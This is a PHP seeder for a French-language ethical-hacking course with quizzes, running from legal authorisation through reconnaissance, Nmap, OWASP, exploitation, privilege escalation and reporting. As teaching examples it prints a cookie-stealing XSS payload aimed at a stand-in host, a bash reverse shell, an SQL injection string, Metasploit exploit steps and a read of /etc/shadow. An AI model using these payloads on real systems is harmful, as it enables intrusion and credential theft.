<?php

namespace Database\Seeders\Roadmaps;

use Illuminate\Database\Seeder;

/**
 * Roadmap Hacking Éthique — devenir pentester en respectant le cadre légal et la méthodologie professionnelle.
 */
class HackingEthiqueRoadmapSeeder extends Seeder
{
    use RoadmapSeederHelper;

    public function run(): void
    {
        $this->createRoadmap([
            'title' => 'Deviens Hacker Éthique (Pentester)',
            'slug' => 'hacking-ethique-pentest',
            'domain' => 'cybersecurite',
            'description' => "Apprends à penser comme un attaquant pour mieux défendre. Cette roadmap couvre le cadre légal, la méthodologie de test d'intrusion (pentest), la reconnaissance, le scan réseau avec Nmap, les vulnérabilités web (OWASP Top 10), l'exploitation, l'élévation de privilèges, la post-exploitation et la rédaction d'un rapport professionnel. Public débutant à intermédiaire visant un métier recherché en Afrique francophone.",
            'objectives' => "Comprendre le cadre légal et l'importance de l'autorisation écrite\nMaîtriser les phases d'un pentest professionnel\nMener une reconnaissance passive et active\nUtiliser Nmap pour scanner réseaux et services\nIdentifier les failles de l'OWASP Top 10\nExploiter des vulnérabilités et élever ses privilèges\nRédiger un rapport de pentest exploitable par le client",
            'icon' => '🛡️',
            'color' => '#DC2626',
            'difficulty' => 'advanced',
            'required_packs' => [],
            'pass_threshold' => 70,
            'order' => 20,
            'levels' => [
                [
                    'title' => 'Niveau 1 — Cadre légal & autorisation',
                    'subtitle' => "Hacker sans autorisation est un crime",
                    'xp_reward' => 100,
                    'content' => "🎯 **Objectif** : comprendre la frontière entre hacking éthique et délit.\n\n💡 Le hacking éthique consiste à tester un système **avec la permission explicite de son propriétaire**. Sans autorisation, c'est une infraction pénale (au Cameroun, loi n°2010/012 sur la cybersécurité et la cybercriminalité).\n\n⚠️ **Document indispensable** : avant tout test, on signe un contrat appelé *Rules of Engagement* (ROE) ou *autorisation de test*. Il précise :\n• Le périmètre (scope) : IP, domaines, applications autorisés\n• Les horaires de test\n• Les actions interdites (ex : déni de service, destruction de données)\n• Les contacts d'urgence\n\n✅ Sans ce document signé, même un simple scan peut t'exposer à des poursuites. Le pentester travaille toujours avec une trace écrite. On distingue le hacker éthique (white hat), le cybercriminel (black hat) et l'intermédiaire (grey hat). Seul le white hat agit légalement.\n\n📌 Règle d'or : *pas d'autorisation écrite = pas de test*.",
                    'questions' => [
                        ['question' => "Que doit obtenir un pentester AVANT de tester un système ?", 'options' => ['Un antivirus à jour', 'Une autorisation écrite du propriétaire', "L'accord oral d'un collègue", 'Un compte administrateur'], 'correct' => [1], 'explanation' => "L'autorisation écrite (ROE) est obligatoire ; sans elle, le test est illégal."],
                        ['question' => "Que définit le périmètre (scope) dans un pentest ?", 'options' => ['Le salaire du pentester', 'Les cibles autorisées (IP, domaines, applications)', 'La couleur du rapport', 'Le nombre de pirates'], 'correct' => [1], 'explanation' => "Le scope liste précisément les actifs que le pentester a le droit de tester."],
                        ['question' => "Quels profils agissent LÉGALEMENT ou de manière encadrée ? (plusieurs réponses)", 'options' => ['White hat avec autorisation', 'Black hat', 'Pentester sous contrat ROE', 'Attaquant volant des données bancaires'], 'correct' => [0, 2], 'explanation' => "Le white hat autorisé et le pentester sous ROE agissent dans un cadre légal, contrairement aux black hats."],
                    ],
                ],
                [
                    'title' => 'Niveau 2 — Méthodologie de pentest',
                    'subtitle' => "Les phases d'un test d'intrusion",
                    'xp_reward' => 110,
                    'content' => "🎯 **Objectif** : connaître les étapes structurées d'un pentest.\n\n💡 Un pentest professionnel suit une méthodologie reconnue (PTES, OSSTMM, ou le guide du NIST). Les grandes phases sont :\n\n1️⃣ **Pré-engagement** : définition du scope et signature du ROE\n2️⃣ **Reconnaissance** : collecte d'informations sur la cible\n3️⃣ **Scan / énumération** : découverte des services et failles\n4️⃣ **Exploitation** : prise de contrôle d'un système\n5️⃣ **Post-exploitation** : persistance, mouvement latéral\n6️⃣ **Reporting** : rédaction du rapport et recommandations\n\n✅ On distingue trois approches selon l'information fournie :\n\n| Type | Connaissance | Réalisme |\n|------|--------------|----------|\n| Black box | Aucune | Vision attaquant externe |\n| Grey box | Partielle | Compromis fréquent |\n| White box | Complète (code, accès) | Audit approfondi |\n\n⚠️ Chaque phase doit être documentée : captures, commandes, horodatage. Cette traçabilité protège le pentester et nourrit le rapport final.",
                    'questions' => [
                        ['question' => "Quelle phase vient juste APRÈS la reconnaissance ?", 'options' => ['Le reporting', 'Le scan / énumération', 'La signature du ROE', "L'élévation de privilèges"], 'correct' => [1], 'explanation' => "Après avoir collecté des infos, on scanne pour découvrir services et vulnérabilités."],
                        ['question' => "Dans une approche black box, que connaît le pentester de la cible ?", 'options' => ['Tout le code source', 'Rien (vision attaquant externe)', 'Les mots de passe admin', "L'architecture complète"], 'correct' => [1], 'explanation' => "En black box, le testeur n'a aucune information préalable, comme un attaquant réel."],
                        ['question' => "Pourquoi documenter chaque phase du pentest ?", 'options' => ['Pour traçabilité, preuve et rédaction du rapport', 'Pour ralentir le test', 'Pour cacher les actions', "Ce n'est pas nécessaire"], 'correct' => [0], 'explanation' => "La documentation assure la traçabilité, protège le pentester et alimente le rapport final."],
                    ],
                ],
                [
                    'title' => 'Niveau 3 — Reconnaissance passive',
                    'subtitle' => "Collecter sans toucher la cible (OSINT)",
                    'xp_reward' => 120,
                    'content' => "🎯 **Objectif** : récolter un maximum d'informations sans interagir directement avec la cible.\n\n💡 La reconnaissance **passive** (OSINT) utilise des sources publiques : on ne génère aucun trafic vers la cible, donc on reste invisible.\n\n🔎 Sources utiles :\n• WHOIS : propriétaire d'un domaine, dates, contacts\n• DNS : enregistrements A, MX, NS\n• Google Dorking : `site:entreprise.cm filetype:pdf`\n• Réseaux sociaux et LinkedIn (employés, technologies)\n• Shodan : appareils exposés sur Internet\n\nExemple de commandes :\n```bash\nwhois entreprise.cm\nnslookup entreprise.cm\nhost -t mx entreprise.cm\n```\n\n✅ Un Google Dork efficace pour trouver des documents oubliés :\n```\nsite:entreprise.cm intext:\"mot de passe\"\n```\n\n⚠️ La reconnaissance passive est discrète mais reste encadrée par le scope. Elle prépare la phase active en dressant la surface d'attaque (sous-domaines, adresses e-mail, technologies utilisées).",
                    'questions' => [
                        ['question' => "Pourquoi la reconnaissance passive est-elle discrète ?", 'options' => ["Elle utilise un VPN", "Elle ne génère pas de trafic direct vers la cible", 'Elle est plus rapide', 'Elle est chiffrée'], 'correct' => [1], 'explanation' => "La recon passive s'appuie sur des sources publiques, sans contacter directement la cible."],
                        ['question' => "Quelle commande affiche le propriétaire et les infos d'un nom de domaine ?", 'options' => ['ping', 'whois', 'cd', 'cat'], 'correct' => [1], 'explanation' => "La commande whois interroge la base d'enregistrement du domaine."],
                        ['question' => "Quels outils relèvent de l'OSINT / recon passive ? (plusieurs réponses)", 'options' => ['Shodan', 'Google Dorking', 'Attaque par force brute en direct', 'WHOIS'], 'correct' => [0, 1, 3], 'explanation' => "Shodan, le Google Dorking et WHOIS exploitent des données publiques, à l'inverse du brute force actif."],
                    ],
                ],
                [
                    'title' => 'Niveau 4 — Reconnaissance active & énumération',
                    'subtitle' => "Interroger directement la cible",
                    'xp_reward' => 130,
                    'content' => "🎯 **Objectif** : interagir avec la cible pour cartographier ses services.\n\n💡 La reconnaissance **active** envoie des paquets vers la cible : plus précise mais plus détectable. On y pratique l'**énumération** : lister utilisateurs, partages, services, versions.\n\n🔧 Techniques courantes :\n• Découverte d'hôtes vivants (ping sweep)\n• Énumération DNS (zone transfer, sous-domaines)\n• Énumération de services (bannières, versions)\n• Recherche de partages SMB, comptes SNMP\n\nExemples :\n```bash\n# Hôtes actifs sur un réseau\nnmap -sn 192.168.1.0/24\n\n# Tentative de transfert de zone DNS\ndig axfr @ns1.entreprise.cm entreprise.cm\n\n# Bannière d'un service\nnc 192.168.1.10 80\n```\n\n✅ L'énumération révèle des détails précieux : version exacte d'un serveur web (Apache 2.4.49), comptes par défaut, partages mal protégés. Ces informations orientent ensuite la recherche de vulnérabilités.\n\n⚠️ Active = bruyant. Sur un test furtif, on espace les requêtes pour éviter de déclencher les systèmes de détection (IDS/IPS).",
                    'questions' => [
                        ['question' => "Quelle différence majeure entre recon passive et active ?", 'options' => ["L'active envoie des paquets vers la cible et est détectable", "La passive est illégale", "L'active ne nécessite pas de scope", 'Aucune différence'], 'correct' => [0], 'explanation' => "La recon active interagit directement avec la cible, ce qui la rend plus détectable."],
                        ['question' => "Que cherche-t-on lors de l'énumération ?", 'options' => ['Le prix des serveurs', 'Utilisateurs, services, versions et partages', 'La météo', 'Le logo du site'], 'correct' => [1], 'explanation' => "L'énumération liste les ressources et versions exploitables de la cible."],
                        ['question' => "Que fait la commande `nmap -sn 192.168.1.0/24` ?", 'options' => ['Scanne tous les ports', 'Découvre les hôtes vivants sans scan de ports', 'Exploite une faille', 'Efface le réseau'], 'correct' => [1], 'explanation' => "L'option -sn réalise une découverte d'hôtes (ping scan) sans balayage de ports."],
                    ],
                ],
                [
                    'title' => 'Niveau 5 — Scan de ports avec Nmap',
                    'subtitle' => "L'outil incontournable du pentester",
                    'xp_reward' => 140,
                    'content' => "🎯 **Objectif** : maîtriser Nmap pour identifier ports, services et systèmes.\n\n💡 **Nmap** (Network Mapper) est l'outil de référence pour scanner un réseau. Il détecte les ports ouverts, les services et leurs versions, et parfois l'OS.\n\n🔧 Types de scan :\n• `-sS` : SYN scan (furtif, semi-ouvert)\n• `-sT` : TCP connect (complet, plus bruyant)\n• `-sU` : scan UDP\n• `-sV` : détection de version des services\n• `-O` : détection du système d'exploitation\n• `-p-` : tous les ports (1 à 65535)\n\nExemple complet :\n```bash\nnmap -sS -sV -O -p- 192.168.1.10\n\n# Scan rapide des 1000 ports courants\nnmap -F 192.168.1.10\n\n# Scripts NSE pour détecter des vulnérabilités\nnmap --script vuln 192.168.1.10\n```\n\n✅ États possibles d'un port : **open** (service actif), **closed** (pas de service), **filtered** (pare-feu bloque). Un port 22 ouvert = SSH ; un port 3306 = MySQL.\n\n⚠️ Le SYN scan (-sS) nécessite des privilèges root mais reste plus discret que le scan TCP complet.",
                    'questions' => [
                        ['question' => "Que fait l'option `-sV` de Nmap ?", 'options' => ["Supprime les ports", 'Détecte la version des services', 'Change le système', 'Lance une attaque DoS'], 'correct' => [1], 'explanation' => "L'option -sV identifie le service et sa version exacte sur chaque port ouvert."],
                        ['question' => "Que signifie l'état `filtered` d'un port ?", 'options' => ['Le port est ouvert', 'Un pare-feu bloque ou filtre les paquets', 'Le service est en panne', 'Le port a été supprimé'], 'correct' => [1], 'explanation' => "Filtered indique qu'un pare-feu empêche Nmap de déterminer l'état réel du port."],
                        ['question' => "Quelles commandes Nmap sont valides ? (plusieurs réponses)", 'options' => ['nmap -p- 192.168.1.10', 'nmap --script vuln 192.168.1.10', 'nmap delete 192.168.1.10', 'nmap -sS 192.168.1.10'], 'correct' => [0, 1, 3], 'explanation' => "-p-, --script vuln et -sS sont des options réelles ; 'delete' n'existe pas dans Nmap."],
                    ],
                ],
                [
                    'title' => 'Niveau 6 — OWASP Top 10 (web)',
                    'subtitle' => "Les failles web les plus critiques",
                    'xp_reward' => 150,
                    'content' => "🎯 **Objectif** : reconnaître les vulnérabilités web majeures classées par l'OWASP.\n\n💡 L'**OWASP Top 10** liste les risques de sécurité web les plus répandus. Les plus connus :\n\n• **Injection** (SQL, commande) : données non filtrées exécutées par le serveur\n• **Broken Access Control** : un utilisateur accède à des ressources interdites\n• **Cryptographic Failures** : données sensibles mal chiffrées\n• **XSS** (Cross-Site Scripting) : injection de JavaScript dans une page\n• **Security Misconfiguration** : paramètres par défaut, services exposés\n\nExemple d'injection SQL classique :\n```sql\n-- Entrée utilisateur : ' OR '1'='1\nSELECT * FROM users WHERE login='' OR '1'='1' -- ';\n```\nCette requête renvoie tous les utilisateurs, contournant l'authentification.\n\nExemple de XSS :\n```html\n<script>document.location='http://attaquant.cm/vol?c='+document.cookie</script>\n```\n\n✅ La parade : valider et échapper toutes les entrées, utiliser des requêtes préparées, appliquer le principe du moindre privilège.\n\n⚠️ Beaucoup de sites de PME (y compris au Cameroun) restent vulnérables à l'injection SQL faute de requêtes préparées.",
                    'questions' => [
                        ['question' => "Quelle entrée provoque une injection SQL contournant le login ?", 'options' => ['admin123', "' OR '1'='1", 'motdepasse', '404'], 'correct' => [1], 'explanation' => "La condition ' OR '1'='1 est toujours vraie et fait passer l'authentification."],
                        ['question' => "Qu'est-ce qu'une attaque XSS ?", 'options' => ["Injection de JavaScript exécuté dans le navigateur de la victime", 'Un scan de ports', 'Un chiffrement de fichiers', 'Une coupure réseau'], 'correct' => [0], 'explanation' => "Le XSS injecte du code script qui s'exécute côté client, souvent pour voler des cookies."],
                        ['question' => "Quelles parades limitent les injections SQL ? (plusieurs réponses)", 'options' => ['Requêtes préparées (paramétrées)', 'Validation des entrées', 'Désactiver le pare-feu', 'Concaténer directement les entrées dans la requête'], 'correct' => [0, 1], 'explanation' => "Les requêtes préparées et la validation des entrées empêchent l'injection ; concaténer ou désactiver le pare-feu aggrave le risque."],
                    ],
                ],
                [
                    'title' => 'Niveau 7 — Exploitation',
                    'subtitle' => "Transformer une faille en accès",
                    'xp_reward' => 160,
                    'content' => "🎯 **Objectif** : exploiter une vulnérabilité identifiée pour obtenir un accès.\n\n💡 L'**exploitation** utilise une faille (CVE, mauvaise config, mot de passe faible) pour exécuter du code ou ouvrir une session. L'outil phare est **Metasploit**.\n\n🔧 Workflow Metasploit :\n```bash\nmsfconsole\nsearch type:exploit vsftpd\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.10\nexploit\n```\n\nUne fois l'exploit réussi, on obtient souvent un **shell** ou un **meterpreter** (session interactive avancée).\n\n💥 Concepts clés :\n• **Payload** : code exécuté après l'exploitation (ex : reverse shell)\n• **Reverse shell** : la cible se connecte à l'attaquant (contourne les pare-feu sortants)\n• **Bind shell** : l'attaquant se connecte à un port ouvert sur la cible\n\nExemple de reverse shell simple :\n```bash\n# Sur la machine attaquante (écoute)\nnc -lvnp 4444\n# Sur la cible\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n```\n\n⚠️ On exploite UNIQUEMENT dans le scope autorisé. Toute exploitation hors périmètre est illégale et peut endommager des systèmes de production.",
                    'questions' => [
                        ['question' => "Qu'est-ce qu'un payload en exploitation ?", 'options' => ["Le code exécuté après l'exploitation réussie", 'Un type de pare-feu', 'Une adresse IP', "Un rapport de pentest"], 'correct' => [0], 'explanation' => "Le payload est la charge utile exécutée sur la cible une fois la faille exploitée."],
                        ['question' => "Pourquoi un reverse shell contourne souvent les pare-feu ?", 'options' => ["Parce qu'il chiffre tout", "Parce que la cible initie la connexion sortante vers l'attaquant", "Parce qu'il utilise le port 80 uniquement", "Parce qu'il désactive le pare-feu"], 'correct' => [1], 'explanation' => "Les pare-feu filtrent surtout l'entrant ; un reverse shell sort de la cible vers l'attaquant."],
                        ['question' => "Quel outil est une référence pour l'exploitation ?", 'options' => ['Microsoft Word', 'Metasploit', 'Photoshop', 'Excel'], 'correct' => [1], 'explanation' => "Metasploit est le framework standard pour rechercher et lancer des exploits."],
                    ],
                ],
                [
                    'title' => 'Niveau 8 — Élévation de privilèges',
                    'subtitle' => "Devenir root / administrateur",
                    'xp_reward' => 170,
                    'content' => "🎯 **Objectif** : passer d'un accès limité à un contrôle total de la machine.\n\n💡 Après une exploitation, on obtient souvent un shell d'utilisateur basique. L'**élévation de privilèges** (privesc) vise à devenir **root** (Linux) ou **administrateur** (Windows).\n\n🔧 Vecteurs courants sous Linux :\n• Binaires SUID mal configurés\n• Tâches cron exécutées en root et modifiables\n• Configuration sudo trop permissive (`sudo -l`)\n• Noyau vulnérable (kernel exploit)\n\nExemples :\n```bash\n# Lister les permissions sudo de l'utilisateur\nsudo -l\n\n# Trouver les binaires SUID\nfind / -perm -4000 -type f 2>/dev/null\n\n# Outil d'énumération automatique\n./linpeas.sh\n```\n\nSous Windows, on cherche : services mal configurés, tokens, mots de passe en clair, `whoami /priv`.\n\n✅ La méthode : énumérer le système (utilisateurs, droits, logiciels), repérer une mauvaise configuration ou une faille, puis l'exploiter pour grimper. Des outils comme **LinPEAS** et **WinPEAS** automatisent cette recherche.\n\n⚠️ Devenir root permet la persistance et l'accès complet : c'est l'objectif central de nombreux pentests internes.",
                    'questions' => [
                        ['question' => "Que vise l'élévation de privilèges ?", 'options' => ["Ralentir la machine", "Passer d'un accès limité à root/administrateur", 'Effacer les logs uniquement', 'Scanner les ports'], 'correct' => [1], 'explanation' => "La privesc transforme un accès utilisateur en contrôle total (root ou admin)."],
                        ['question' => "Que liste la commande `find / -perm -4000 -type f` ?", 'options' => ['Les fichiers SUID', 'Les ports ouverts', 'Les utilisateurs connectés', 'Les processus zombies'], 'correct' => [0], 'explanation' => "Cette commande recherche les binaires avec le bit SUID, souvent exploitables pour la privesc."],
                        ['question' => "Quels éléments sont des vecteurs d'élévation de privilèges Linux ? (plusieurs réponses)", 'options' => ['Binaires SUID mal configurés', 'Configuration sudo trop permissive', "Un fond d'écran rouge", 'Tâches cron modifiables exécutées en root'], 'correct' => [0, 1, 3], 'explanation' => "SUID, sudo permissif et cron en root sont des vecteurs classiques ; le fond d'écran n'a aucun impact."],
                    ],
                ],
                [
                    'title' => 'Niveau 9 — Post-exploitation',
                    'subtitle' => "Persistance, pivot et collecte",
                    'xp_reward' => 185,
                    'content' => "🎯 **Objectif** : maintenir l'accès et étendre la compromission de façon contrôlée.\n\n💡 La **post-exploitation** regroupe tout ce qui suit la prise de contrôle :\n\n• **Persistance** : garantir un retour même après reboot (clé SSH, tâche planifiée, service)\n• **Collecte** : récupérer mots de passe, hashes, données sensibles\n• **Mouvement latéral (pivot)** : rebondir vers d'autres machines du réseau interne\n• **Nettoyage** : restaurer l'état initial en fin de mission\n\nExemples :\n```bash\n# Récupérer les hashes Linux\ncat /etc/shadow\n\n# Pivoter via une session meterpreter\nrun autoroute -s 10.0.0.0/24\n```\n\n💥 Le mouvement latéral est crucial : depuis une machine compromise, on attaque les serveurs internes (base de données, contrôleur de domaine) qui n'étaient pas accessibles depuis l'extérieur.\n\n✅ Bonne pratique pentester : documenter chaque action, capturer des preuves (screenshots, hashes obtenus), puis **nettoyer** les comptes, fichiers et backdoors créés. Un pentest professionnel ne laisse jamais le système dans un état dégradé.\n\n⚠️ Toute donnée sensible collectée doit être traitée selon la confidentialité prévue au contrat.",
                    'questions' => [
                        ['question' => "Qu'est-ce que le mouvement latéral (pivot) ?", 'options' => ["Rebondir vers d'autres machines du réseau interne", 'Éteindre le serveur', 'Changer de bureau', 'Mettre à jour le système'], 'correct' => [0], 'explanation' => "Le pivot utilise une machine compromise pour atteindre des systèmes internes inaccessibles de l'extérieur."],
                        ['question' => "Pourquoi un pentester doit-il nettoyer en fin de mission ?", 'options' => ['Pour gagner du temps', "Pour ne pas laisser le système dégradé ni de backdoors", 'Pour effacer ses traces illégalement', "Ce n'est pas utile"], 'correct' => [1], 'explanation' => "Le nettoyage restaure l'état initial et supprime les accès créés, par professionnalisme et sécurité."],
                        ['question' => "Qu'est-ce que la persistance ?", 'options' => ['Un type de pare-feu', "Maintenir l'accès même après un redémarrage", 'Un scan UDP', 'Un chiffrement des logs'], 'correct' => [1], 'explanation' => "La persistance garantit le retour de l'attaquant via clé SSH, service ou tâche planifiée."],
                    ],
                ],
                [
                    'title' => 'Niveau 10 — Rapport de pentest & carrière',
                    'subtitle' => "Le livrable qui fait la différence",
                    'xp_reward' => 200,
                    'content' => "🎯 **Objectif** : produire un rapport clair, exploitable, et lancer sa carrière de pentester.\n\n💡 Le **rapport** est le vrai livrable : le client paie pour des recommandations, pas pour des exploits. Un bon rapport contient :\n\n• **Résumé exécutif** : pour les dirigeants, sans jargon (niveau de risque global)\n• **Méthodologie** : périmètre, dates, approche\n• **Vulnérabilités** : description, **criticité** (CVSS), preuve (capture), impact\n• **Recommandations** : correctifs concrets et priorisés\n\nExemple de notation de criticité :\n\n| Faille | CVSS | Priorité |\n|--------|------|----------|\n| Injection SQL | 9.8 Critique | Immédiate |\n| Mot de passe faible | 6.5 Moyen | Court terme |\n| Bannière exposée | 3.1 Faible | À planifier |\n\n✅ Chaque vulnérabilité doit être **reproductible** : étapes précises pour que l'équipe IT vérifie et corrige.\n\n🏆 **Félicitations !** Tu maîtrises désormais le cycle complet d'un pentest, du cadre légal au rapport. Débouchés : **pentester junior**, analyste SOC, consultant cybersécurité, Red Team. Vise les certifications **eJPT**, **CEH** puis **OSCP** pour décrocher des missions au Cameroun, en Afrique et à l'international. La cybersécurité manque cruellement de talents : ta carrière commence maintenant ! 🚀",
                    'questions' => [
                        ['question' => "Quel est le vrai livrable d'un pentest pour le client ?", 'options' => ['Les exploits utilisés', 'Le rapport avec vulnérabilités et recommandations', 'La liste des outils', 'Les mots de passe volés'], 'correct' => [1], 'explanation' => "Le client paie pour un rapport actionnable qui lui permet de corriger ses failles."],
                        ['question' => "À qui s'adresse le résumé exécutif d'un rapport ?", 'options' => ['Aux dirigeants, sans jargon technique', 'Uniquement aux développeurs', 'Aux pirates', 'À personne'], 'correct' => [0], 'explanation' => "Le résumé exécutif présente le risque global aux décideurs, sans détails techniques."],
                        ['question' => "Quelles certifications visent une carrière de pentester ? (plusieurs réponses)", 'options' => ['OSCP', 'CEH', 'Permis de conduire', 'eJPT'], 'correct' => [0, 1, 3], 'explanation' => "OSCP, CEH et eJPT sont des certifications reconnues en test d'intrusion."],
                    ],
                ],
            ],
        ]);

        $this->command->info('  ✓ Roadmap Hacking Éthique créée (10 niveaux).');
    }
}
